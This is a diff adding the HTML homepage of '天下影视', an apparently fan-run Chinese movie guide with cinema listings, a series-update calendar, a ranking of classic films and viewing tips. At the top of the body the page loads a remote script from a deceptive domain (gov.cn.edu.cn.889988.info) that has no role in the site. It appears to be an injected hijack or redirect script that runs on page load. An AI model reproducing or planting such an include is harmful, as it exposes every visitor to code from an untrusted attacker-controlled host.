@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>天下影视｜院线热映排期·剧集追更日历·影史评分榜单 - tianxiayingshi-app.github.io</title>
+<meta name="description" content="天下影视（tianxiayingshi-app.github.io）是一份由影迷维护的观影手册：每日整理院线热映排期与新片上映日期，同步剧集追更日历，收录豆瓣高分影史榜单与冷门佳片，并给出选片、画质、字幕、影厅座位等实用观影建议，帮你少踩雷、多看片。">
+<meta name="keywords" content="天下影视,天下影视官网,tianxiayingshi-app,院线热映排期,新片上映时间表,剧集追更日历,影史评分榜单,冷门佳片推荐,观影指南,电影推荐网站">
+<meta name="author" content="天下影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#10131a">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://tianxiayingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="天下影视">
+<meta property="og:title" content="天下影视｜院线热映排期·剧集追更日历·影史评分榜单">
+<meta property="og:description" content="每天更新的观影手册：热映排期、剧集追更、影史榜单、踩雷预警与选片建议，都在天下影视。">
+<meta property="og:url" content="https://tianxiayingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="天下影视｜院线热映排期·剧集追更日历·影史评分榜单">
+<meta name="twitter:description" content="热映排期、剧集追更、影史榜单与观影指南，一站看完再决定今晚看什么。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg:#10131a;--bg2:#171b24;--line:#262c39;--txt:#e8eaf0;--sub:#9aa3b4;
+--gold:#ffc861;--red:#e8534f;--green:#5fd0a8;
+--f:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{background:var(--bg);color:var(--txt);font-family:var(--f);font-size:16px;line-height:1.75;
+background-image:radial-gradient(circle at 12% 8%,rgba(255,200,97,.07),transparent 42%),radial-gradient(circle at 88% 4%,rgba(232,83,79,.07),transparent 40%);
+background-attachment:fixed}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 20px}
+.skip{position:absolute;left:-9999px}
+.skip:focus{left:12px;top:12px;background:var(--gold);color:#10131a;padding:8px 14px;border-radius:6px;z-index:99}
+
+/* 顶部导航 */
+.top{position:sticky;top:0;z-index:50;background:rgba(16,19,26,.92);border-bottom:1px solid var(--line);backdrop-filter:saturate(160%) blur(10px)}
+.top .wrap{display:flex;align-items:center;gap:18px;height:60px}
+.brand{display:flex;align-items:baseline;gap:10px;flex-shrink:0}
+.brand b{font-size:21px;letter-spacing:2px;color:var(--gold);font-weight:800}
+.brand span{font-size:11px;color:var(--sub);letter-spacing:.4px}
+.menu{display:flex;gap:4px;margin-left:auto}
+.menu a{font-size:14px;color:var(--sub);padding:7px 11px;border-radius:6px;transition:.2s}
+.menu a:hover,.menu a:focus{color:var(--gold);background:rgba(255,200,97,.1)}
+.burger{display:none;margin-left:auto;width:40px;height:34px;border:1px solid var(--line);border-radius:6px;background:var(--bg2);cursor:pointer}
+.burger i{display:block;width:16px;height:2px;background:var(--sub);margin:4px auto;border-radius:2px}
+#nav{display:none}
+@media(max-width:860px){
+.menu{display:none}
+.burger{display:block}
+#nav:checked~.menu{display:flex;flex-direction:column;position:absolute;left:0;right:0;top:60px;background:var(--bg2);
+border-bottom:1px solid var(--line);padding:10px 20px 16px;gap:2px}
+#nav:checked~.menu a{padding:11px 6px;border-bottom:1px solid #20252f;font-size:15px}
+}
+
+/* 首屏：票根式不对称布局 */
+.hero{padding:58px 0 46px}
+.hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;align-items:center}
+.kicker{display:inline-block;font-size:12px;letter-spacing:3px;color:#10131a;background:var(--gold);
+padding:4px 12px;border-radius:3px;font-weight:700;margin-bottom:18px}
+h1{font-size:42px;line-height:1.22;letter-spacing:1px;font-weight:800}
+h1 em{font-style:normal;color:var(--gold);border-bottom:4px solid rgba(255,200,97,.28)}
+.lede{margin-top:18px;color:var(--sub);font-size:16.5px;max-width:34em}
+.lede strong{color:var(--txt);font-weight:600}
+.btnrow{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap}
+.btn{display:inline-block;padding:11px 22px;border-radius:6px;font-size:15px;font-weight:600;border:1px solid transparent}
+.btn-p{background:var(--gold);color:#10131a}
+.btn-g{border-color:var(--line);color:var(--txt);background:var(--bg2)}
+.btn:hover{transform:translateY(-1px);opacity:.92}
+
+/* 胶片装饰块 */
+.film{position:relative;border:1px solid var(--line);border-radius:10px;background:var(--bg2);padding:16px;overflow:hidden}
+.film::before,.film::after{content:"";position:absolute;left:0;right:0;height:26px;
+background-image:radial-gradient(circle,var(--bg) 4px,transparent 5px);background-size:18px 18px;background-position:6px 5px}
+.film::before{top:0}.film::after{bottom:0}
+.film-in{margin:26px 0;display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.f-card{aspect-ratio:3/4;border-radius:6px;display:flex;align-items:flex-end;padding:9px;font-size:12px;line-height:1.4;
+background:linear-gradient(160deg,#2b3550,#14181f)}
+.f-card:nth-child(2){background:linear-gradient(160deg,#4a3320,#14181f)}
+.f-card:nth-child(3){background:linear-gradient(160deg,#3a2230,#14181f)}
+.f-card:nth-child(4){background:linear-gradient(160deg,#204038,#14181f)}
+.f-card:nth-child(5){background:linear-gradient(160deg,#3d2b46,#14181f)}
+.f-card:nth-child(6){background:linear-gradient(160deg,#4a3a1c,#14181f)}
+.f-card span{color:#fff;text-shadow:0 1px 3px rgba(0,0,0,.8);font-size:11.5px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:22px;border-top:1px dashed var(--line);padding-top:20px}
+.stats div b{display:block;font-size:24px;color:var(--gold);font-family:Georgia,serif}
+.stats div small{color:var(--sub);font-size:12.5px}
+
+/* 栏目通用 */
+section{padding:52px 0;border-top:1px solid var(--line)}
+.shead{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+h2{font-size:27px;letter-spacing:1px;font-weight:800;position:relative;padding-left:16px}
+h2::before{content:"";position:absolute;left:0;top:8px;bottom:8px;width:5px;background:var(--gold);border-radius:3px}
+.shead p{color:var(--sub);font-size:14px;max-width:30em}
+.tag{font-size:12px;color:var(--sub);border:1px solid var(--line);padding:3px 9px;border-radius:20px}
+
+/* 票根卡片 */
+.tickets{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:18px}
+.ticket{position:relative;display:grid;grid-template-columns:96px 1fr;gap:16px;background:var(--bg2);
+border:1px solid var(--line);border-radius:10px;padding:16px;transition:.25s}
+.ticket:hover{border-color:rgba(255,200,97,.45);transform:translateY(-2px)}
+.ticket::before,.ticket::after{content:"";position:absolute;top:50%;width:14px;height:14px;border-radius:50%;
+background:var(--bg);transform:translateY(-50%);border:1px solid var(--line)}
+.ticket::before{left:-8px}.ticket::after{right:-8px}
+.poster{aspect-ratio:3/4;border-radius:6px;display:flex;align-items:center;justify-content:center;
+font-size:12px;color:#fff;text-align:center;padding:6px;line-height:1.3;letter-spacing:1px}
+.p1{background:linear-gradient(150deg,#3b4a72,#151922)}
+.p2{background:linear-gradient(150deg,#6b4630,#151922)}
+.p3{background:linear-gradient(150deg,#2f5a4c,#151922)}
+.p4{background:linear-gradient(150deg,#5c2b3a,#151922)}
+.p5{background:linear-gradient(150deg,#4a3c68,#151922)}
+.p6{background:linear-gradient(150deg,#6a5a24,#151922)}
+.ticket h3{font-size:17px;font-weight:700;letter-spacing:.5px}
+.ticket h3 a:hover{color:var(--gold)}
+.meta{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0 10px;font-size:12px;color:var(--sub)}
+.meta i{font-style:normal;border:1px solid var(--line);border-radius:3px;padding:1px 7px}
+.score{color:var(--gold);font-weight:700;font-family:Georgia,serif}
+.ticket p{font-size:14px;color:var(--sub);line-height:1.65}
+.ticket .more{display:inline-block;margin-top:10px;font-size:13px;color:var(--gold)}
+
+/* 追更日历 */
+.cal{display:grid;grid-template-columns:1.2fr .8fr;gap:22px}
+.tl{list-style:none;border-left:2px solid var(--line);padding-left:0}
+.tl li{position:relative;padding:0 0 22px 22px}
+.tl li::before{content:"";position:absolute;left:-7px;top:8px;width:12px;height:12px;border-radius:50%;
+background:var(--bg);border:2px solid var(--gold)}
+.tl li:last-child{padding-bottom:0}
+.tl time{display:block;font-size:12px;color:var(--gold);letter-spacing:1px;font-family:Georgia,serif}
+.tl h3{font-size:16.5px;margin:3px 0 6px;font-weight:700}
+.tl p{font-size:14px;color:var(--sub)}
+.panel{background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:20px;align-self:start}
+.panel h3{font-size:16px;margin-bottom:14px;color:var(--gold);letter-spacing:1px}
+.panel ol{list-style:none;counter-reset:n}
+.panel li{counter-increment:n;display:flex;gap:10px;padding:9px 0;border-bottom:1px dashed #232936;font-size:14px}
+.panel li:last-child{border-bottom:0}
+.panel li::before{content:counter(n);flex:0 0 22px;height:22px;border-radius:4px;background:#232936;color:var(--gold);
+font-size:12px;display:flex;align-items:center;justify-content:center;font-family:Georgia,serif}
+.panel li b{flex:1;font-weight:500}
+.panel li em{font-style:normal;color:var(--sub);font-size:12.5px}
+
+/* 榜单 */
+.rank{display:grid;gap:12px}
+.row{display:grid;grid-template-columns:44px 1fr 150px 62px;align-items:center;gap:16px;background:var(--bg2);
+border:1px solid var(--line);border-radius:9px;padding:14px 18px}
+.row .no{font-family:Georgia,serif;font-size:22px;color:var(--gold);text-align:center}
+.row:nth-child(-n+3) .no{color:var(--red)}
+.row .tt{font-size:16px;font-weight:600}
+.row .tt small{display:block;color:var(--sub);font-size:12.5px;font-weight:400;margin-top:2px}
+.bar{height:7px;border-radius:4px;background:#232936;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--red),var(--gold))}
+.row .pt{text-align:right;font-family:Georgia,serif;color:var(--gold);font-size:17px}
+
+/* 指南 */
+.guide{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:18px}
+.g-card{background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:20px}
+.g-card h3{font-size:16px;margin-bottom:10px;display:flex;align-items:center;gap:9px}
+.g-card h3 b{width:24px;height:24px;flex:0 0 24px;border-radius:5px;background:rgba(255,200,97,.14);color:var(--gold);
+font-size:12px;display:flex;align-items:center;justify-content:center}
+.g-card p{font-size:14px;color:var(--sub)}
+.g-card ul{margin-top:10px;list-style:none}
+.g-card li{font-size:14px;color:var(--sub);padding-left:14px;position:relative;margin-top:6px}
+.g-card li::before{content:"";position:absolute;left:0;top:11px;width:5px;height:5px;border-radius:50%;background:var(--gold)}
+details{border:1px solid var(--line);border-radius:9px;background:var(--bg2);margin-top:16px;padding:0 18px}
+summary{cursor:pointer;padding:15px 0;font-size:15.5px;font-weight:600;list-style:none}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"＋";float:right;color:var(--gold)}
+details[open] summary::after{content:"－"}
+details p{font-size:14px;color:var(--sub);padding-bottom:15px;border-top:1px dashed #232936;padding-top:12px}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.15fr .85fr;gap:26px}
+.about p{color:var(--sub);font-size:15px;margin-bottom:14px}
+.about p strong{color:var(--txt)}
+.card-q{background:linear-gradient(160deg,#1b212c,#141821);border:1px solid var(--line);border-radius:10px;padding:22px}
+.card-q h3{font-size:16px;color:var(--gold);margin-bottom:12px}
+.card-q p{font-size:14px;color:var(--sub);margin-bottom:14px}
+.urlbox{display:block;word-break:break-all;background:#0c0f15;border:1px dashed var(--line);border-radius:7px;
+padding:12px 14px;font-size:13.5px;color:var(--green);font-family:Consolas,Monaco,monospace}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:#0c0f15;padding:40px 0 30px;margin-top:10px}
+.f-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:26px}
+footer h4{font-size:14px;color:var(--gold);margin-bottom:12px;letter-spacing:1px}
+footer ul{list-style:none}
+footer li{font-size:13.5px;color:var(--sub);padding:4px 0}
+footer li a:hover{color:var(--gold)}
+.copy{border-top:1px solid #1a1e27;margin-top:26px;padding-top:18px;font-size:12.5px;color:#6d7688;
+display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.toTop{position:fixed;right:18px;bottom:18px;width:42px;height:42px;border-radius:50%;background:var(--bg2);
+border:1px solid var(--line);color:var(--gold);display:flex;align-items:center;justify-content:center;font-size:16px;z-index:40}
+
+@media(max-width:860px){
+.hero{padding:38px 0 30px}
+.hero-grid,.cal,.about,.f-grid{grid-template-columns:1fr}
+h1{font-size:31px}
+h2{font-size:23px}
+.film-in{grid-template-columns:repeat(3,1fr)}
+.row{grid-template-columns:34px 1fr 58px;gap:12px;padding:12px 14px}
+.row .bar{grid-column:2/4}
+.stats{grid-template-columns:repeat(3,1fr);gap:8px}
+.stats div b{font-size:20px}
+section{padding:40px 0}
+.ticket{grid-template-columns:78px 1fr}
+}
+@media(max-width:420px){
+.ticket{grid-template-columns:1fr}
+.ticket::before,.ticket::after{display:none}
+.poster{aspect-ratio:16/9}
+.stats div small{font-size:11px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<a class="skip" href="#main">跳到主要内容</a>
+<input type="checkbox" id="nav" aria-label="展开导航菜单">
+
+<header class="top">
+  <div class="wrap">
+    <div class="brand"><b>天下影视</b><span>tianxiayingshi-app.github.io</span></div>
+    <label class="burger" for="nav" aria-label="菜单"><i></i><i></i><i></i></label>
+    <nav class="menu" aria-label="站内栏目导航">
+      <a href="#hot">正在热映</a>
+      <a href="#series">剧集追更</a>
+      <a href="#rank">影史榜单</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+
+  <div class="hero wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="kicker">今晚看什么 · 先看这里</span>
+        <h1>天下影视：把选片的<em>两小时</em><br>压缩成三分钟</h1>
+        <p class="lede">院线在映什么、剧集更到第几集、哪部老片值得补——天下影视每天把这些整理成一张清单。不写空话，只写<strong>这片子值不值得你花两小时</strong>，以及它适合在什么状态下看。</p>
+        <div class="btnrow">
+          <a class="btn btn-p" href="#hot">查看本周热映</a>
+          <a class="btn btn-g" href="#rank">先看影史榜单</a>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-in">
+          <div class="f-card"><span>本周新映<br>4 部</span></div>
+          <div class="f-card"><span>院线<br>在映 27 部</span></div>
+          <div class="f-card"><span>剧集<br>追更 12 部</span></div>
+          <div class="f-card"><span>评分<br>9 分以上 9 部</span></div>
+          <div class="f-card"><span>冷门<br>补片 63 部</span></div>
+          <div class="f-card"><span>影评<br>本周更新 18 篇</span></div>
+        </div>
+      </div>
+    </div>
+    <div class="stats">
+      <div><b>27</b><small>院线在映片目（每日复核排期）</small></div>
+      <div><b>1,860+</b><small>已收录片库条目，含冷门与修复版</small></div>
+      <div><b>12</b><small>正在同步更新的剧集追更表</small></div>
+    </div>
+  </div>
+
+  <section id="hot">
+    <div class="wrap">
+      <div class="shead">
+        <h2>正在热映</h2>
+        <p>排期以各地影院实际放映为准，标注的评分来自本站影迷打分，满分 10 分。<span class="tag">更新至本周</span></p>
+      </div>
+      <div class="tickets">
+        <article class="ticket">
+          <div class="poster p1">城中<br>夜航</div>
+          <div>
+            <h3><a href="#">城中夜航 · 4K 修复版</a></h3>
+            <div class="meta"><i>剧情</i><i>132 分钟</i><i>2D / 中国巨幕</i><span class="score">8.7</span></div>
+            <p>三条线在同一个雨夜收口，前半段看着散，最后一刻钟全串上了。适合安静看完，别中途刷手机。</p>
+            <a class="more" href="#">查看排期与影厅 →</a>
+          </div>
+        </article>
+        <article class="ticket">
+          <div class="poster p2">砂丘<br>来信</div>
+          <div>
+            <h3><a href="#">砂丘来信</a></h3>
+            <div class="meta"><i>西部</i><i>148 分钟</i><i>IMAX 特供</i><span class="score">8.1</span></div>
+            <p>摄影是这部片的主角，风沙和落日几乎抢走所有台词。剧情偏慢，冲着画面去的人不会失望。</p>
+            <a class="more" href="#">查看排期与影厅 →</a>
+          </div>
+        </article>
+        <article class="ticket">
+          <div class="poster p3">第七<br>号温室</div>
+          <div>
+            <h3><a href="#">第七号温室</a></h3>
+            <div class="meta"><i>悬疑</i><i>109 分钟</i><i>2D</i><span class="score">7.6</span></div>
+            <p>密闭空间戏，全程只有五个演员。反转在最后十分钟，中段稍拖，可等流媒体再补。</p>
+            <a class="more" href="#">查看排期与影厅 →</a>
+          </div>
+        </article>
+        <article class="ticket">
+          <div class="poster p4">晚风<br>电台</div>
+          <div>
+            <h3><a href="#">晚风电台</a></h3>
+            <div class="meta"><i>喜剧 / 音乐</i><i>101 分钟</i><i>2D</i><span class="score">7.9</span></div>
+            <p>小城电台的群像戏，笑点密集但不闹。后半段那场直播拍得很动人，适合周末放松。</p>
+            <a class="more" href="#">查看排期与影厅 →</a>
+          </div>
+        </article>
+        <article class="ticket">
+          <div class="poster p5">铁轨<br>以南</div>
+          <div>
+            <h3><a href="#">铁轨以南</a></h3>
+            <div class="meta"><i>家庭</i><i>124 分钟</i><i>2D</i><span class="score">8.4</span></div>
+            <p>祖孙三代的一条线，情绪压着拍，没有煽情配乐。带长辈一起看会很合适。</p>
+            <a class="more" href="#">查看排期与影厅 →</a>
+          </div>
+        </article>
+        <article class="ticket">
+          <div class="poster p6">深潜<br>三十米</div>
+          <div>
+            <h3><a href="#">深潜三十米</a></h3>
+            <div class="meta"><i>纪录</i><i>92 分钟</i><i>2D / 杜比</i><span class="score">8.9</span></div>
+            <p>本年度目前最佳纪录长片，水下镜头拍了三年。声音设计建议选杜比厅，普通厅会打折。</p>
+            <a class="more" href="#">查看排期与影厅 →</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="series">
+    <div class="wrap">
+      <div class="shead">
+        <h2>剧集追更</h2>
+        <p>每周一、周四复核更新进度，掉队的剧会标红提醒。<span class="tag">周更 / 全集</span></p>
+      </div>
+      <div class="cal">
+        <ol class="tl">
+          <li>
+            <time>本周一 更新至 第 12 集</time>
+            <h3><a href="#">长夜将尽</a></h3>
+            <p>共 24 集，已过半。本周两集节奏明显加快，第二集结尾留了个坑。</p>
+          </li>
+          <li>
+            <time>上周四 更新至 第 8 集</time>
+            <h3><a href="#">雾港事务所</a></h3>
+            <p>单元剧结构，每两集一个案子，可以攒着看，不用每周追。</p>
+          </li>
+          <li>
+            <time>上周三 全集 12 集</time>
+            <h3><a href="#">春分之后</a></h3>
+            <p>已完结，适合一个周末补完。全剧无注水，节奏干净。</p>
+          </li>
+          <li>
+            <time>本周二 更新至 第 3 集</time>
+            <h3><a href="#">第九街区</a></h3>
+            <p>新开播，前两集在铺设定，第三集开始进入主线，可以再观察两集。</p>
+          </li>
+          <li>
+            <time>上周日 更新至 第 30 集</time>
+            <h3><a href="#">旧厂区的夏天</a></h3>
+            <p>长剧，中段有注水。建议跳看第 18—22 集，其他照常。</p>
+          </li>
+        </ol>
+        <aside class="panel">
+          <h3>本周追更优先级</h3>
+          <ol>
+            <li><b>长夜将尽</b><em>刚更新 · 别被剧透</em></li>
+            <li><b>深潜三十米</b><em>院线在映</em></li>
+            <li><b>春分之后</b><em>已完结 · 可补</em></li>
+            <li><b>雾港事务所</b><em>攒 4 集再看</em></li>
+            <li><b>第九街区</b><em>观望中</em></li>
+            <li><b>旧厂区的夏天</b><em>跳看</em></li>
+          </ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="wrap">
+      <div class="shead">
+        <h2>影史榜单</h2>
+        <p>榜单依据本站累计打分与影评数量排出，每年 12 月重排一次。<span class="tag">满分 10 分</span></p>
+      </div>
+      <div class="rank">
+        <div class="row">
+          <div class="no">1</div>
+          <div class="tt"><a href="#">肖申克的救赎</a><small>剧情 / 1994 / 美国 · 越狱与长期主义</small></div>
+          <div class="bar"><i style="width:97%"></i></div>
+          <div class="pt">9.7</div>
+        </div>
+        <div class="row">
+          <div class="no">2</div>
+          <div class="tt"><a href="#">霸王别姬</a><small>剧情 / 1993 / 中国 · 戏与人的一生</small></div>
+          <div class="bar"><i style="width:96%"></i></div>
+          <div class="pt">9.6</div>
+        </div>
+        <div class="row">
+          <div class="no">3</div>
+          <div class="tt"><a href="#">千与千寻</a><small>动画 / 2001 / 日本 · 成长与告别</small></div>
+          <div class="bar"><i style="width:95%"></i></div>
+          <div class="pt">9.5</div>
+        </div>
+        <div class="row">
+          <div class="no">4</div>
+          <div class="tt"><a href="#">教父</a><small>犯罪 / 1972 / 美国 · 家族与权力交接</small></div>
+          <div class="bar"><i style="width:94%"></i></div>
+          <div class="pt">9.4</div>
+        </div>
+        <div class="row">
+          <div class="no">5</div>
+          <div class="tt"><a href="#">活着</a><small>剧情 / 1994 / 中国 · 时代下的普通人</small></div>
+          <div class="bar"><i style="width:93%"></i></div>
+          <div class="pt">9.3</div>
+        </div>
+        <div class="row">
+          <div class="no">6</div>
+          <div class="tt"><a href="#">控方证人</a><small>悬疑 / 1957 / 美国 · 法庭反转教科书</small></div>
+          <div class="bar"><i style="width:92%"></i></div>
+          <div class="pt">9.2</div>
+        </div>
+        <div class="row">
+          <div class="no">7</div>
+          <div class="tt"><a href="#">天堂电影院</a><small>剧情 / 1988 / 意大利 · 放映员与那些删掉的吻</small></div>
+          <div class="bar"><i style="width:91%"></i></div>
+          <div class="pt">9.1</div>
+        </div>
+        <div class="row">
+          <div class="no">8</div>
+          <div class="tt"><a href="#">海上钢琴师</a><small>剧情 / 1998 / 意大利 · 船、琴与不下船的人</small></div>
+          <div class="bar"><i style="width:90%"></i></div>
+          <div class="pt">9.0</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide">
+    <div class="wrap">
+      <div class="shead">
+        <h2>观影指南</h2>
+        <p>选片、选厅、选版本的一些实操经验，写完就不再改，除非被现实打脸。</p>
+      </div>
+      <div class="guide">
+        <div class="g-card">
+          <h3><b>1</b>怎么判断值不值得进影院</h3>
+          <p>先看这三条，全中就去，否则等流媒体：</p>
+          <ul>
+            <li>摄影或美术有明确风格，大银幕能吃出来</li>
+            <li>声音设计被影评反复提到（选杜比/全景声厅）</li>
+            <li>剧透风险高，晚看一天就被刷到结局</li>
+          </ul>
+        </div>
+        <div class="g-card">
+          <h3><b>2</b>影厅座位怎么挑</h3>
+          <p>不看"正中间"这个说法，看银幕宽度：</p>
+          <ul>
+            <li>最佳距离约为银幕宽度的 1.2—1.5 倍</li>
+            <li>横向取中间三分之一，纵向略高于中点一排</li>
+            <li>IMAX 前五排会仰头，脖子累，慎选</li>
+          </ul>
+        </div>
+        <div class="g-card">
+          <h3><b>3</b>补老片从哪一部开始</h3>
+          <p>别按榜单从上往下啃，按心情挑：</p>
+          <ul>
+            <li>想被安慰：看治愈系，节奏慢一点的</li>
+            <li>想被刺激：看悬疑与法庭戏，反转密集</li>
+            <li>想被震到：看纪实类，比剧情片更狠</li>
+          </ul>
+        </div>
+        <div class="g-card">
+          <h3><b>4</b>字幕与版本</h3>
+          <p>同一部片，版本差别比想象中大：</p>
+          <ul>
+            <li>修复版优先于早年的压缩版本</li>
+            <li>导演剪辑版不一定更好，先看时长差多少</li>
+            <li>外语片优先选官方字幕，民间字幕常有漏译</li>
+          </ul>
+        </div>
+      </div>
+      <details>
+        <summary>天下影视的评分是怎么算出来的？</summary>
+        <p>本站评分来自站内影迷打分与影评权重的加权结果，参与人数少于 200 人的条目不进入榜单。为避免刷分，新片上映首周的分数不公开，只显示"待定"。榜单每年 12 月重排一次，重排后旧榜会存档保留。</p>
+      </details>
+      <details>
+        <summary>排期信息多久更新一次，准不准？</summary>
+        <p>热映排期每天复核一次，临时撤档、密钥延期这类变动会在当天补上。但具体到某一家影院某一场，仍以影院售票系统为准，本站只做参考，别拿它当购票依据。</p>
+      </details>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap">
+      <div class="shead">
+        <h2>关于天下影视</h2>
+        <p>一个小站，几支笔，一台常年开着的投影仪。</p>
+      </div>
+      <div class="about">
+        <div>
+          <p>天下影视从 2019 年开始更新，最早只是几个影迷在群里互相抄片单，后来抄出了规模，就做了这个站。我们不接发行方的推广，也不做"评分解锁"那类生意——<strong>写差评比写好评容易，因为差评有人看</strong>。</p>
+          <p>站内内容分三块：排期与追更这类<strong>信息</strong>，榜单与影评这类<strong>观点</strong>，以及观影指南这类<strong>经验</strong>。信息部分力求准确，观点部分欢迎反驳，经验部分随时会被更好的做法替换掉。</p>
+          <p>如果你发现排期写错了、评分被刷了、或者某部冷门片我们漏了，欢迎把线索留在评论区，编辑部每天都会看。被采纳的补片推荐会署上你的名字。</p>
+        </div>
+        <div class="card-q">
+          <h3>本站地址</h3>
+          <p>收藏下面这个地址，别从搜索结果里乱点进来的镜像站：</p>
+          <span class="urlbox">https://tianxiayingshi-app.github.io</span>
+          <p style="margin-top:14px">网站名称：天下影视　·　域名：tianxiayingshi-app.github.io<br>内容更新：每日 09:00 复核排期，每周一、周四更新追更表。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div>
+        <h4>天下影视</h4>
+        <p style="font-size:13.5px;color:var(--sub);max-width:30em">院线排期、剧集追更、影史榜单与观影指南。本站不提供任何影片的在线播放与下载资源，仅做信息整理与观影建议。</p>
+        <p style="font-size:13px;color:var(--sub);margin-top:10px;font-family:Consolas,Monaco,monospace">https://tianxiayingshi-app.github.io</p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#hot">正在热映</a></li>
+          <li><a href="#series">剧集追更</a></li>
+          <li><a href="#rank">影史榜单</a></li>
+          <li><a href="#guide">观影指南</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>本站</h4>
+        <ul>
+          <li><a href="#about">关于天下影视</a></li>
+          <li><a href="#">投稿与纠错</a></li>
+          <li><a href="#">评分规则说明</a></li>
+          <li><a href="#">隐私与声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2019—2026 天下影视 tianxiayingshi-app.github.io　保留所有权利</span>
+      <span><a href="#main">回到顶部 ↑</a></span>
+    </div>
+  </div>
+</footer>
+
+<a class="toTop" href="#main" aria-label="回到顶部">↑</a>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://tianxiayingshi-app.github.io/#website",
+      "url":"https://tianxiayingshi-app.github.io/",
+      "name":"天下影视",
+      "alternateName":"天下影视官网",
+      "inLanguage":"zh-CN",
+      "description":"天下影视整理院线热映排期、剧集追更日历、影史评分榜单与实用观影指南，帮影迷快速决定看什么。"
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://tianxiayingshi-app.github.io/#org",
+      "url":"https://tianxiayingshi-app.github.io/",
+      "name":"天下影视",
+      "description":"由影迷维护的影视信息与观影建议站点，提供排期、追更、榜单与指南四类内容。"
+    },
+    {
+      "@type":"BreadcrumbList",
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"天下影视","item":"https://tianxiayingshi-app.github.io/"},
+        {"@type":"ListItem","position":2,"name":"正在热映","item":"https://tianxiayingshi-app.github.io/#hot"},
+        {"@type":"ListItem","position":3,"name":"剧集追更","item":"https://tianxiayingshi-app.github.io/#series"},
+        {"@type":"ListItem","position":4,"name":"影史榜单","item":"https://tianxiayingshi-app.github.io/#rank"},
+        {"@type":"ListItem","position":5,"name":"观影指南","item":"https://tianxiayingshi-app.github.io/#guide"}
+      ]
+    }
+  ]
+}
+</script>
+</body>
+</html>
